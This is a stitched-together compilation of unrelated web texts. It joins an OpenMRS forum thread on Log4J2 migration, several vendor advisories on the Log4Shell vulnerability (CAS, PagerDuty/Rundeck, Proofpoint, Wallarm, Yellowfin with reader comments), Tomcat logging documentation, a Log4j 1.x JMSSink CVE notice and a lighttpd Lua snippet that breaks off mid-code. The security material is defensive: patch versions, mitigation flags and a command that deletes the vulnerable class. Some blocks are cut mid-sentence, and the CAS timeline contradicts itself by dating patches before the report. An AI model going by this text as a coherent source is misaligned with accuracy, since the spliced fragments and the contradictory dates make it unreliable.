* [a926a70](https://github.com/openmrs/openmrs-module-legacyui/commit/a926a7003d9aeb75b8e8f730d661d3148b5891cf) (Added a hack to be able to load messages from the `MemoryAppender` via reflection on appropriate versions of OpenMRS)

I don’t think these changes can just be backported and released as an existing version, because we’d break things for anyone who was using a non-updated 2.1.1. Alternatively, I suppose, alternative pathways could be devised to load the `MemoryAppender` in 2.1.1 depending on the presence of a `getMemoryAppender()` method, but that’s not built into the existing PRs and would need to be new development work.

The easiest path forward I can see is to get Bahmni running against Core 2.1.4 (the changes for which [can be found here](https://github.com/openmrs/openmrs-core/compare/2.1.1...2.1.4)… I haven’t extensively reviewed them). Then we could maybe work on backporting the Log4J2 patches to the 2.1.x branch and release that as 2.1.5 at least that way we can make suitable changes to at least the REST API to be able to load the server log or, if that’s not a feature Bahmni uses, I suppose we could skip it altogether.

I’m, of course, willing to supply whatever support and guidance I can on backporting these patches, but I likely don’t have enough time to take it on as a project myself. It might also be easier to look at the state of things once [TRUNK-6052](https://github.com/openmrs/openmrs-core/pull/3949) gets merged in as I think that makes a lot of useful changes that should’ve been part of the initial implementation (hopefully it will be ready by the end of the week).

I’ve merged TRUNK-6052 [in this commit](https://github.com/openmrs/openmrs-core/commit/8ae383b26d41d7714163315eb0c5e3555d7fb250). As I said above, this is kind of a key feature that really should’ve been in 2.4.0 from the beginning.

Thanks much [@ibacher](/u/ibacher) for the detailed commits list. This did help us a lot to start with the log4j changes on 2.1.4 OMRS version. We are still working on the log4j changes for both legacy UI and REST modules.

Thanks so much [@ibacher](/u/ibacher) for all the effort and the detailed & well-reasoned description.

If the Bahmni team can get these changes adapted for and applied to 2.1.x, do we think it might make it a little easier to forward-port those changes to 2.2 & 2.3?

[@burke](/u/burke) Yes… forward-porting is usually more straight-forward that backporting.

The bigger issue around this is that this change will definitely break code (which is why I didn’t initially backport it). E.g., [this code from Iniz](https://github.com/mekomsolutions/openmrs-module-initializer/blob/295313ca2afd6ac9777afa021e3564c5da28d461/api/src/main/java/org/openmrs/module/initializer/InitializerActivator.java#L46), or [this code from PIH](https://github.com/PIH/openmrs-module-pihcore/blob/81725b46a002cc99a2e0c186dd8f14ff76ad1b9b/omod/src/main/java/org/openmrs/module/pihcore/RequestMonitoringFilter.java#L57). IIRC, calls to `setLevel()` should continue to work, but anything that attempts to create an appender is either a no-op (like `logger.addAppender()`) or will throw an exception, e.g., by attempting to create a new non-console appender.

# CAS Log4J Vulnerability Disclosure

Saturday, Dec 11, 2021

3 minute read

# Overview

A new zero-day exploit has been reported against the Log4J2 library which can allow an attacker to remotely execute code. The vulnerability has been reported with [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) against the `log4j-core` jar. This has been fixed in [Log4J v2.17.0](https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.17.0/). While updating third-party libraries for patch releases is generally not the project policy, an exception is warranted in this case given the nature of this vulnerability.

CAS security releases are now made available to ensure the Log4J library is upgraded to a more secure version.

For additional details on how security issues, patches and announcements are handled, please read the [Apereo CAS project vulnerability disclosure](https://apereo.github.io/cas/developer/Sec-Vuln-Response.html) process.

# Affected Deployments

The security issue described here, [per the CAS maintenance policy](https://apereo.github.io/cas/developer/Maintenance-Policy.html), affects the Apereo CAS server for the following versions:

```
- 6.3.x
- 6.4.x

```

If your CAS version is not listed above and is still part of an active maintenance cycle [per the CAS maintenance policy](https://apereo.github.io/cas/developer/Maintenance-Policy.html), you *might* need to take manual action to ensure the Log4J library is upgraded to a more recent acceptable version. Examine the Log4J library version found in your CAS build to determine its vulnerability status, and then substitute as necessary.

# Severity

See [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228). Also see [this post](https://logging.apache.org/log4j/2.x/security.html).

> It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allows attackers with control over Thread Context Map (MDC) input data when the logging configuration uses a non-default Pattern Layout with either a Context Lookup (for example, $${ctx:loginId}) or a Thread Context Map pattern (%X, %mdc, or %MDC) to craft malicious input data using a JNDI Lookup pattern resulting in a denial of service (DOS) attack. Log4j 2.15.0 restricts JNDI LDAP lookups to localhost by default.

Note that previous mitigations involving configuration such as to set the system property `log4j2.noFormatMsgLookup` to true **do NOT mitigate this specific vulnerability**.

Then, per [CVE-2021-45105](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105),

> Apache Log4j2 versions 2.0-alpha1 through 2.16.0 did not protect from uncontrolled recursion from self-referential lookups. When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a StackOverflowError that will terminate the process. This is also known as a DOS (Denial of Service) attack.

# Timeline

The issue was originally reported on December 9th, 2021 and CAS releases were patched on October 10th-11th, 2021 and released. The original patch releases for this issue upgraded relevant CAS versions to Log4J `2.15.0`. In light of [this post](https://logging.apache.org/log4j/2.x/security.html), additional patch releases were published on December 15th 2021 to upgrade Log4J to `2.16.0`. Then, following [this announcement](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2321524), additional patch releases were published to upgrade Log4J to `2.17.0` on December 17th, 2021.

# Patching

Patch releases are available to address CAS deployments. Upgrades to the next patch version for each release should be a drop-in replacement.

## Procedure

**Note**
### 6.3.x

Modify your CAS overlay to point to the version `6.3.7.4`.

### 6.4.x

Modify your CAS overlay to point to the version `6.4.4.2`.

# Support

# December 15th Update

On Friday December 10th 2021, PagerDuty became aware of a critical severity zero-day exploit known as “Log4Shell” in the Log4j library, which is widely used in numerous systems, websites, applications and digital services around the world. We reacted immediately and addressed the known issues across our portfolio in a patch release.

Subsequently, on Tuesday, December 14th 2021, a secondary CVE was published also relating to Log4j2. This necessitated a second patch release, which in some cases must be applied by our customers, specifically on customer managed products. Rundeck Enterprise and Community customers that have already patched to 3.4.7 should now also upgrade to 3.4.8 to address these new vulnerabilities.

If you are running Rundeck Enterprise or Rundeck Community, you should apply the following patches to your environment immediately. Please see the important messages below.

Rundeck Enterprise versions 3.4.6 and below require you to immediately patch to mitigate the vulnerability.

Further details on the patch and mitigation are below and also on [our webpage](https://docs.rundeck.com/docs/history/CVEs/#log4j-cve-2021-44228).

## Rundeck Enterprise/Community

Rundeck 3.4.8 and 3.3.16 are available as of December 14th 2021 with the updated libraries necessary to bring Log4j up to a secure version. These versions will address both CVEs issued for the Log4j vulnerabilities.

CVE-2021-44228

Please contact our support team ([[email protected]](/cdn-cgi/l/email-protection#fd8e888d8d928f89bd8d9c9a988f99888984d39e9290) or [[email protected]](/cdn-cgi/l/email-protection#b9caccc9c9d6cbcdf9cbccd7dddcdad297dad6d4)) if you have any further questions.

# December 13th

On Friday December 10th, PagerDuty and many others became aware of a critical severity zero-day exploit known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately spun up a security incident and have been actively taking steps to mitigate and monitor the situation. We know our customers trust PagerDuty to manage their own incidents and we wanted to share a more detailed update of impact and progress to date.

PagerDuty’s SaaS platform does not make extensive use of Java. However in services and components where we identified use of this library, the vulnerability did not appear exploitable or we are running a current version that is not impacted by this exploit.

PagerDuty systems that leveraged the Log4j library version that required mitigation in order to avoid the log4j zero-day vulnerability “[CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)” have been updated.

**If you are running Rundeck Enterprise or Open Source, a patch update is required. Please see important messages below.**

* Where we did locate the vulnerable library, those services have already been updated out of an abundance of caution, and all known areas were upgraded by end of day Friday, December 10th.
* PagerDuty’s network and firewall architecture limits the ability of this exploit to be successful, and we have added additional steps at our network layer to reduce the possibility of exploitation.
* We continue to monitor for attempts by threat actors to attempt the exploit. If your organization is doing the same, you may consider creating an alert in PagerDuty.
* Rundeck Enterprise versions 3.4.6 and below require you to immediately patch to mitigate the vulnerability. Further details on the patch and mitigation are below and also [on our webpage](https://docs.rundeck.com/docs/history/CVEs/#log4j-cve-2021-44228).
* We will continue to coordinate with our subprocessors, including AWS, to determine impacts to their environments and services as well, and we will continue to take action on any updates required as we learn of them.

## PagerDuty SaaS

Our teams will continue to monitor for impacts on sub-processor or dependent systems, but we have updated all known areas of impact to our SaaS offering and we are continuing to monitor all PagerDuty services and environments. At this time PagerDuty SaaS customers do not need to take any additional action for their PagerDuty SaaS environment.

## Rundeck Enterprise/OSS

If you are running Rundeck Enterprise or Open Source, please immediately take the following actions to mitigate the CVE for Rundeck versions 3.4.6 and below:

* Add this flag to the JVM options for starting rundeck:

  `-Dlog4j2.formatMsgNoLookups=true`
* Set `env var LOG4J_FORMAT_MSG_NO_LOOKUPS=true`
* Modify the file `$RDECK_BASE/server/config/log4j2.properties`, replace the string `%m` with `%m{nolookups}`

Rundeck 3.4.7 GA is available as of December 10th with the updated libraries necessary to bring Log4j up to a safe version.

* [Enterprise](https://packagecloud.io/pagerduty/rundeckpro)
* [Community](https://packagecloud.io/pagerduty/rundeck)

Rundeck 3.3.15 GA was released on December 13th.

Please contact our support team ([[email protected]](/cdn-cgi/l/email-protection#4c3f393c3c233e380c3c2d2b293e28393835622f2321) or [[email protected]](/cdn-cgi/l/email-protection#fb888e8b8b94898fbb898e959f9e9890d5989496)) if you have any further questions.

Proofpoint’s Response to the Log4j Vulnerability

# Proofpoint’s Response to the Log4j Vulnerability

Share with your network!

 February 09, 2022

Proofpoint

At Proofpoint, as in many organizations, it’s been an all hands on deck exercise since details emerged around CVE-2021-44228 (also known as Log4Shell). In situations like these, we bring together our global teams to identify and remedy any risks to customer environments as well as investigate any exposure we may have ourselves.

Once the Log4j vulnerability was disclosed and over the weekend, we posted guidance to our [Communities site](https://www.proofpoint.com/us/support/community) for Proofpoint customers and relayed status via our global support teams. However, given the serious risk and security community attention on this vulnerability, we’re posting our latest status as a public blog as well. Please see below for the full table for the details on the applicability of CVE-2021-44228 on individual Proofpoint products.

In addition, we always try to share our own work in detecting exploitation of vulnerabilities--especially one as widespread as Log4Shell vulnerabilities—for free. We’ve updated the Emerging Threats Open ruleset several times with additional signatures for Snort and Suricata, and it’s easy to get the latest via the instructions [here](https://rules.emergingthreatspro.com/OPEN_download_instructions.html).

We are aware of another vulnerability that impacts log4j2, CVE-2021-45046, as well as changes to the effectiveness of countermeasures.  Remediation for these issues is complete.

We are aware of CVE-2021-45105 and CVE-2021-44832, which affect log4j2, and have assessed their impact/severity.  Based on the currently available information, we plan to address these issues as part of our normal patch and vulnerability management processes.

We’ll continue providing updates first through our normal channels (Communities and Support), which should be consulted first, but will also keep this blog current. We recommend you check back frequently to confirm the latest status of our products. In the meantime, our thoughts are with all the security teams who are working nights and weekends to protect their organizations.

### Introduction

The internal logging for Apache Tomcat uses JULI, a packaged renamed fork
of [Apache Commons Logging](https://commons.apache.org/logging)
that is hard-coded to use the `java.util.logging` framework.
This ensures that Tomcat's internal logging and any web application
logging will remain independent, even if a web application uses Apache
Commons Logging.

To configure Tomcat to use an alternative logging framework for its
internal logging, follow the instructions provided by the alternative
logging framework for redirecting logging for applications that use
`java.util.logging`. Keep in mind that the alternative logging
framework will need to be capable of working in an environment where
different loggers with the same name may exist in different class loaders.

A web application running on Apache Tomcat can:

* Use any logging framework of its choice.
* Use system logging API, `java.util.logging`.
* Use the logging API provided by the Java Servlets specification,
  `javax.servlet.ServletContext.log(...)`

The logging frameworks used by different web applications are independent.
See [class loading](class-loader-howto.html) for more details.
The exception to this rule is `java.util.logging`. If it is
used directly or indirectly by your logging library then elements of it
will be shared across web applications because it is loaded by the system
class loader.

#### Java logging API — java.util.logging

Apache Tomcat has its own implementation of several key elements of
`java.util.logging` API. This implementation is called JULI.
The key component there is a custom LogManager implementation,
that is aware of different web applications running on Tomcat (and
their different class loaders). It supports private per-application
logging configurations. It is also notified by Tomcat when a web application
is unloaded from memory, so that the references to its classes can be
cleared, preventing memory leaks.

This `java.util.logging` implementation is enabled by providing
certain system properties when starting Java. The Apache Tomcat startup
scripts do this for you, but if you are using different tools to run
Tomcat (such as jsvc, or running Tomcat from within an IDE), you should
take care of them by yourself.

More details about java.util.logging may be found in the documentation
for your JDK and on its Javadoc pages for the `java.util.logging`
package.

More details about Tomcat JULI may be found below.

#### Servlets logging API

The calls to `javax.servlet.ServletContext.log(...)` to write
log messages are handled by internal Tomcat logging. Such messages are
logged to the category named

```
org.apache.catalina.core.ContainerBase.[${engine}].[${host}].[${context}]
```

This logging is performed according to the Tomcat logging configuration. You
cannot overwrite it in a web application.

The Servlets logging API predates the `java.util.logging` API
that is now provided by Java. As such, it does not offer you much options.
E.g., you cannot control the log levels. It can be noted, though, that
in Apache Tomcat implementation the calls to `ServletContext.log(String)`
or `GenericServlet.log(String)` are logged at the INFO level.
The calls to `ServletContext.log(String, Throwable)` or
`GenericServlet.log(String, Throwable)`
are logged at the SEVERE level.

#### Console

When running Tomcat on unixes, the console output is usually redirected
to the file named `catalina.out`. The name is configurable
using an environment variable. (See the startup scripts).
Whatever is written to `System.err/out` will be caught into
that file. That may include:

* Uncaught exceptions printed by `java.lang.ThreadGroup.uncaughtException(..)`
* Thread dumps, if you requested them via a system signal

When running as a service on Windows, the console output is also caught
and redirected, but the file names are different.

The default logging configuration in Apache Tomcat writes the same
messages to the console and to a log file. This is great when using
Tomcat for development, but usually is not needed in production.

Old applications that still use `System.out` or `System.err`
can be tricked by setting `swallowOutput` attribute on a
[Context](config/context.html). If the attribute is set to
`true`, the calls to `System.out/err` during request
processing will be intercepted, and their output will be fed to the
logging subsystem using the
`javax.servlet.ServletContext.log(...)` calls.

**Note**, that the `swallowOutput` feature is
actually a trick, and it has its limitations.
It works only with direct calls to `System.out/err`,
and only during request processing cycle. It may not work in other
threads that might be created by the application. It cannot be used to
intercept logging frameworks that themselves write to the system streams,
as those start early and may obtain a direct reference to the streams
before the redirection takes place.

#### Access logging

Access logging is a related but different feature, which is
implemented as a `Valve`. It uses self-contained
logic to write its log files. The essential requirement for
access logging is to handle a large continuous stream of data
with low overhead, so it only uses Apache Commons Logging for
its own debug messages. This implementation approach avoids
additional overhead and potentially complex configuration.
Please refer to the [Valves](config/valve.html#Access_Logging)
documentation for more details on its configuration, including
the various report formats.

### Using java.util.logging (default)

The default implementation of java.util.logging provided in the JDK is too
limited to be useful. The key limitation is the inability to have per-web
application logging, as the configuration is per-VM. As a result, Tomcat
will, in the default configuration, replace the default LogManager
implementation with a container friendly implementation called JULI, which
addresses these shortcomings.

JULI supports the same configuration mechanisms as the standard JDK
`java.util.logging`, using either a programmatic approach, or
properties files. The main difference is that per-classloader properties
files can be set (which enables easy redeployment friendly webapp
configuration), and the properties files support extended constructs which
allows more freedom for defining handlers and assigning them to loggers.

JULI is enabled by default, and supports per classloader configuration, in
addition to the regular global java.util.logging configuration. This means
that logging can be configured at the following layers:

* Globally. That is usually done in the
  `${catalina.base}/conf/logging.properties` file.
  The file is specified by the `java.util.logging.config.file`
  System property which is set by the startup scripts.
  If it is not readable or is not configured, the default is to use the
  `${java.home}/lib/logging.properties` file in the JRE.
* In the web application. The file will be
  `WEB-INF/classes/logging.properties`

The default `logging.properties` in the JRE specifies a
`ConsoleHandler` that routes logging to System.err.
The default `conf/logging.properties` in Apache Tomcat also
adds several `AsyncFileHandler`s that write to files.

A handler's log level threshold is `INFO` by default and can be set using
`SEVERE`, `WARNING`, `INFO`, `CONFIG`,
`FINE`, `FINER`, `FINEST` or `ALL`.
You can also target specific packages to collect logging from and specify
a level.

To enable debug logging for part of Tomcat's internals, you should
configure both the appropriate logger(s) and the appropriate handler(s) to
use the `FINEST` or `ALL` level. e.g.:

```
org.apache.catalina.session.level=ALL
java.util.logging.ConsoleHandler.level=ALL
```

When enabling debug logging it is recommended that it is enabled for the
narrowest possible scope as debug logging can generate large amounts of
information.

The configuration used by JULI is the same as the one supported by plain
`java.util.logging`, but uses a few extensions to allow better
flexibility in configuring loggers and handlers. The main differences are:

* A prefix may be added to handler names, so that multiple handlers of a
  single class may be instantiated. A prefix is a String which starts with a
  digit, and ends with '.'. For example, `22foobar.` is a valid
  prefix.
* System property replacement is performed for property values which
  contain `${systemPropertyName}`.
* If using a class loader that implements the
  `org.apache.juli.WebappProperties` interface (Tomcat's
  web application class loader does) then property replacement is also
  performed for `${classloader.webappName}`,
  `${classloader.hostName}` and
  `${classloader.serviceName}` which are replaced with the
  web application name, the host name and the service name respectively.
* By default, loggers will not delegate to their parent if they have
  associated handlers. This may be changed per logger using the
  `loggerName.useParentHandlers` property, which accepts a
  boolean value.
* The root logger can define its set of handlers using the
  `.handlers` property.
* By default the log files will be kept on the file system for
  `90` days. This may be changed per handler using the
  `handlerName.maxDays` property. If the specified value for the
  property is `≤0` then the log files will be kept on the
  file system forever, otherwise they will be kept the specified maximum
  days.

There are several additional implementation classes, that can be used
together with the ones provided by Java. The notable ones are
`org.apache.juli.FileHandler` and `org.apache.juli.AsyncFileHandler`.

`org.apache.juli.FileHandler` supports buffering of the
logs. The buffering is not enabled by default. To configure it, use the
`bufferSize` property of a handler. The value of `0`
uses system default buffering (typically an 8K buffer will be used). A
value of `<0` forces a writer flush upon each log write. A
value `>0` uses a BufferedOutputStream with the defined
value but note that the system default buffering will also be
applied.

`org.apache.juli.AsyncFileHandler` is a subclass of `FileHandler`
that queues the log messages and writes them asynchronously to the log files.
Its additional behaviour can be configured by setting some
[system properties](config/systemprops.html#Logging).

Example logging.properties file to be placed in $CATALINA\_BASE/conf:

```
handlers = 1catalina.org.apache.juli.AsyncFileHandler, \
           2localhost.org.apache.juli.AsyncFileHandler, \
           3manager.org.apache.juli.AsyncFileHandler, \
           java.util.logging.ConsoleHandler

#### Documentation references

See the following resources for additional information:

* Apache Tomcat Javadoc for the
  [`org.apache.juli`](api/org/apache/juli/package-summary.html)
  package.
* Oracle Java 8 Javadoc for the
  [`java.util.logging`](https://docs.oracle.com/javase/8/docs/api/java/util/logging/package-summary.html)
  package.

#### Considerations for production usage

You may want to take note of the following:

* Consider removing `ConsoleHandler` from configuration. By
  default (thanks to the `.handlers` setting) logging goes both
  to a `AsyncFileHandler` and to a `ConsoleHandler`. The
  output of the latter one is usually captured into a file, such as
  `catalina.out`. Thus you end up with two copies of the same
  messages.
* Consider removing `AsyncFileHandler`s for the applications
  that you do not use. E.g., the one for `host-manager`.
* Consider configuring an
  [Access log](config/valve.html#Access_Logging).

# Log4j 0day mitigation update CVE-2021-44228

[September 12, 2022](https://lab.wallarm.com/cve-2021-44228-mitigation-update/)

1 Min Read

[![Log4j 0day mitigation update CVE-2021-44228](data:image/svg+xml... "Log4j 0day mitigation update CVE-2021-44228")](https://i0.wp.com/lab.wallarm.com/wp-content/uploads/2021/12/Log4j-0day-mitigation-update-CVE-2021-44228-min-min.png?fit=2048%2C1152&ssl=1)

* Wallarm has rolled out the update to detect and mitigate CVE-2021-44228.
* No additional actions are required from the customers
* Attempts at exploitation will be automatically blocked in a blocking mode
* When working in a monitoring mode, consider creating a virtual patch

## Log4Shell

A 0-day exploit in the Java core library log4j was discovered that results in [Remote Code Execution](https://www.wallarm.com/what/the-concept-of-rce-remote-code-execution-attack) (RCE) by simple 1-line exploit with JNDI URL. Given how ubiquitous this library is, the impact of the exploit (full server control), and how easy it is to exploit, the impact of this vulnerability is quite severe. Read more.

The attack surface is very wide since it’s almost impossible to find any single Java project without the log4j library enabled. It affects internal services and [APIs that are based on Java](https://www.wallarm.com/what/what-is-java-api) and uses other API and application data to log them.

## Wallarm update

Wallarm automatically identifies attempts of the Log4Shell exploitation and logs these attempts in the Wallarm Console. Corresponding changes have been added within two hours after the first information about CVE-2021-44228 has been published.

## Mitigation

When using Wallarm in blocking mode, these attacks will be automatically blocked. No actions are required.

When using a monitoring mode, we suggest creating a virtual patch. Feel free to reach out to support@wallarm.com if you need assistance.

# Remote Code Execution in Log4j [CVE-2021-44228]

#

*Update January 10, 09:12 AEST:* *Yellowfin is aware of existing CVE's against log4j 2.16([CVE-2021-45105](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105) & [CVE-2021-44832](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44832)). Yellowfin's default logging configuration is not vulnerable to either without modification to the log4j2.xml file. The log4j library will be upgraded in a future release, TBD.*

*Update December 21, 12:00 AEST: Patched versions 8.0.10.4, 9.4.2.1, 9.5.1.1 and 9.6.2.1 have now been added to the Docker page. Text in the post below has been updated to reflect this.*

*Update December 20, 19:40 AEST:* *Yellowfin is aware of the newly discovered vulnerability in log4j, per* [CVE-2021-45105](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105)*. Initial review of this vulnerability indicates that Yellowfin log4j2 configurations do not include the vulnerable lookup type. Testing is ongoing to determine whether this can be exploited against Yellowfin in spite of this consideration.*

*This vulnerability has been graded lower than previously reported vulnerabilities below and at present there are no plans to publish an emergency patch. We will continue to monitor the situation, and this vulnerability will be considered for a future patch release.*

*Update December 17, 15:56 AEST: Patches for versions 9.6, 9.5, and 9.4 are now available. Please see section ‘Remediation Option 1’ below for links. We are currently working on patched releases for older impacted versions of 8, which will also be added here.*

*Update December 15, 20:21 AEST: Patches for Yellowfin versions 9.7 and 8.0.10 to mitigate exposure are now available. These patches use the updated log4j2.16 library. Please see the post below for updated links and remediation advice. We highly recommend that you use the patches, but if this is not possible,use one of the other (new) remediation options.*

*We are currently working on patched releases for earlier versions, which will be added below once available. Further updates to follow.*

*Update December 15, 14:34 AEST: Additional information has come to light showing that [log4j2.15 is also exploitable](https://www.zdnet.com/article/second-log4j-vulnerability-found-apache-log4j-2-16-0-released/). We are currently in the process of patching the latest YF releases with the updated log4j2.16 library. Further updates to follow.*

*Update December 14, 16:45 AEST: Ongoing testing has revealed scenarios in which Yellowfin software is vulnerable to the log4j vulnerability. The remediation steps below should be implemented as soon as possible.*

Log4j 2.x in versions earlier than 2.16.0 are affected by a critical vulnerability that can lead to remote code execution (RCE) in some circumstances. This does not affect Yellowfin software in releases prior to December 2020, but does affect more recent releases. Affected Releases;

9 series : 9.4.0 or later

8 series : 8.0.8 or later

*v7 and v6 releases are not affected unless you have manually upgraded to Log4j2.*

The following information is provided to all our customers regardless of their setup. Due to the severity of this vulnerability, we highly recommend you apply the patched version of Yellowfin, or one of the other two remediation options, to fully protect your systems

## Vulnerability details

From the official CVE:

Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP Servers when message lookup substitution is enabled.

Yellowfin versions 8.0.8 to 8.0.10.1, and Yellowfin 9.4 to 9.7 ship with log4j 2.13.3, which is affected.

Remediation option 1: install the patch

We have released patches for Yellowfin 8 and 9 that use an unaffected version of log4j (log4j2 2.16.0).

Version 9.7.0.3

Version 9.6.2.1

Version 9.4.2.1

Version 9.5.1.1

Version 8.0.10.4

Please visit our [Yellowfin Releases](https://portal.yellowfinbi.com/public/releases/home) page to download the version that is relevant for you. It is recommended to go to the closest minor version to your current install to minimise any possible disruption (9.7.x, 9.6.x, 9.4.x etc.)

Yellowfin Docker: Images updated to 9.7.0.3, 8.0.10.4, 9.4.2.1, 9.5.1.1 and 9.6.2.1: <https://hub.docker.com/r/yellowfinbi/yellowfin-app-only>

Remediation option 2: upgrade log4j in an existing Yellowfin instance

It is possible to upgrade log4j in Yellowfin independently of a patch. Download log4j 2.17.0 binary distribution from the [log4j website](https://logging.apache.org/log4j/2.x/download.html). This remediation option will work on all versions of Yellowfin that are affected by the vulnerability.

From the distribution zip file, extract the following files and copy them into the Yellowfin/appserver/webapps/ROOT/WEB-INF/lib folder:

log4j-1.2-api-2.17.0.jar

log4j-api-2.17.0.jar

log4j-core-2.17.0.jar

log4j-web-2.17.0.jar

You will also need to remove the existing log4j libraries in the folder. These files will have the same names, but with a different version number. Either version 2.13.3 or 2.15.0. If you do not remove the existing files, the system may not start, or could still be vulnerable to the exploit.

After replacing the log4j libraries, restart Yellowfin.

Upgrading Yellowfin’s log4j libraries independently of a Yellowfin patch may break future upgrades. When performing an upgrade, it may be necessary to revert to the old libraries prior to the upgrade. (The upgrade would then deliver a new version of log4j as part of the upgrade process).

Remediation Option 3 - Remove the JNDI handler class from log4j.

It is possible to remove the internal code that causes the vulnerability from the vulnerable version of log4j. This internal code is present in JndiLookup.class in the log4j-core-2.13.3.jar file.

Run this command from the classpath to remove the code from the library: zip -q -d log4j-core-\*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

Once the class is removed from the library, restart Yellowfin for the changes to take effect.

We recommend you perform one of the remediation options immediately for protection against this vulnerability.

This seems to not be the instructions for when YF is run as a windows service? Please provide the instructions to apply this when running a windows service as soon as possible.

Hi Veronika,

I can confirm that versions of 7.4 and earlier are using the log4j 1.x version, which is not impacted by this listing.

Are you certain that 1.x versions of log4j are not impacted?

* Please note that Log4j 1.x has reached end of life and is no longer supported. Vulnerabilities reported after August 2015 against Log4j 1.x were not checked and will not be fixed. Users should upgrade to Log4j 2 to obtain security fixes.

<https://logging.apache.org/log4j/2.x/security.html>

* Log4j version 1.x is not directly vulnerable, because it does not offer a JNDI look up mechanism. However, Log4j 1.x comes with JMSAppender, which will perform a JNDI lookup if enabled in Log4j's configuration file (i.e., log4j.properties or log4j.xml). Thus, an attacker who can write to an application's Log4j configuration file can perform a remote code execution attack whenever Log4j 1.x reads its malicious configuration file.

Are you able to confirm at this time if the logon page is vulnerable to any unauthenticated attacks?

So just to be clear...

1. You initially thought Yellowfin was vulnerable
2. You've since realised that, when using the default configuration, Yellowfin is not vulnerable
3. You're still advising admins to patch / upgrade to mitigate due to the severity of the vulnerability

Hi Tormod,

Apologies for the confusion, the situation is still evolving, as of right now we are vulnerable, and it seems log4j has been patched again as vulnerabilities were found in 2.15, we're currently working on another update as we speak.

Thanks,David

```

@Ravi, you might try something like the above. sounds like there'll be another mitigation to be applied for the second cve though

```
    && unzip yellowfin-9.6.2-20211028-full.jar yfres/yellowfin.zip \
    && unzip yfres/yellowfin.zip appserver/bin/catalina.sh \
    && sed \
         -e '1 i\JAVA_OPTS="$JAVA_OPTS -Dlog4j2.formatMsgNoLookups=true"' \

@Ravi, you might try something like the above. sounds like there'll be another mitigation to be applied for the second cve though

Hi we have Yellowfin 8.0.2 running with log4j-1.2.17.jar. Will the latest patch be ok to apply as it references 8.0.1 ?

Hi Michael,

log4j is not affected by the above listing. 8.0.8 releases and later ship with log4j2. We have provided patches for 8.0.10 (not 8.0.1 as it's not required).

Hope this clears up any confusion.

Thanks,

David

Hi, will you be releasing an update using version 2.16 to address CVE-2021-45046? 2.15 is still susceptible attack

The previous mitigations involving configuration such as to set the system property `log4j2.noFormatMsgLookup` to `true` do NOT mitigate this specific vulnerability. Log4j 2.16.0 fixes this issue by removing support for message lookup patterns and disabling JNDI functionality by default. This issue can be mitigated in prior releases (<2.16.0) by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-\*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class).

Hello,

You've removed the previous guidance to set the following configuration

-Dlog4j2.formatMsgNoLookups=true"

Is that still a valid remediation strategy?

I thought the same thing at first. These two files are actually separate. (log4j-core-2.16.0.jarlog4j-web-2.16.0.jar). It was just a typo when trying to get the fix out to us quickly. They should have been separated by a space or on a separate line. All files are in the zip and in the tar.gz.

Like this...

log4j-1.2-api-2.16.0.jar

Subject: CVE-2022-23302: Deserialization of untrusted data in JMSSink in
 Apache Log4j 1.x

Severity: high

Description:

JMSSink in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a TopicConnectionFactoryBindingName configuration causing JMSSink to perform JNDI requests that result in remote code execution in a similar fashion to CVE-2021-4104.

Note this issue only affects Log4j 1.x when specifically configured to use JMSSink, which is not the default.

Apache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.

Mitigation:

Users should upgrade to Log4j 2 or remove usage of the JMSSink from their configurations.

It's useful, handy, simple and sometimes a quite powerful combo which gives you some additional flexibility and offers you solutions to small and big problems other httpds can't solve!

Again, we hope that you, the users of lighttpd, support this page by contributing links, code-snippets or simply offer your lua scripts with small descriptions of what they do and how it helps lighttpd to do stuff you want it to do.

# Code-Snippets[¶](#Code-Snippets)

**Apache .htaccess alternatives**

Options for [migrating .htaccess functionality to lighttpd](/projects/lighttpd/wiki/DevelProblemAndSolution#htaccess-like-functionality)

A common idiom in Apache .htaccess:
`RewriteCond %{REQUEST_FILENAME} !-f`
`RewriteCond %{REQUEST_FILENAME} !-d`
`RewriteRule ^(.*)$ index.php?q=$1 [L,QSA]`

lighttpd alternatives:

* [url.rewrite-if-not-file](/projects/lighttpd/wiki/Docs_ModRewrite#urlrewrite-repeat-if-not-file) (recommended if !-f is sufficient; does not check !-d)
* [lua mod\_rewrite](/projects/lighttpd/wiki/ModMagnetExamples#lua-mod_rewrite) (**recommended**; simpler than option below)
* mod\_magnet rewrite paths without restarting request (below)

As lighttpd doesn't provide this is\_file/is\_dir check out of the box, again mod\_magnet comes into play. I took the example for drupal from darix site.

Lets assume drupal is already installed under <http://example.com/drupal/> you now add the magnet part to it.

```

$HTTP["url"] =~ "^/drupal" {
    # we only need index.php here.
    index-file.names = ( "index.php" )
    # for clean urls
    magnet.attract-physical-path-to = ( "/etc/lighttpd/drupal.lua" )
}

```

The drupal.lua:

```

-- little helper function
function file_exists(path)
  return lighty.stat(path) and true or false
end
function removePrefix(str, prefix)
  return str:sub(1,#prefix+1) == prefix.."/" and str:sub(#prefix+2)
end

-- prefix without the trailing slash
local prefix = '/drupal'

-- the magic ;)
if (not file_exists(lighty.env["physical.path"])) then
    -- file still missing. pass it to the fastcgi backend
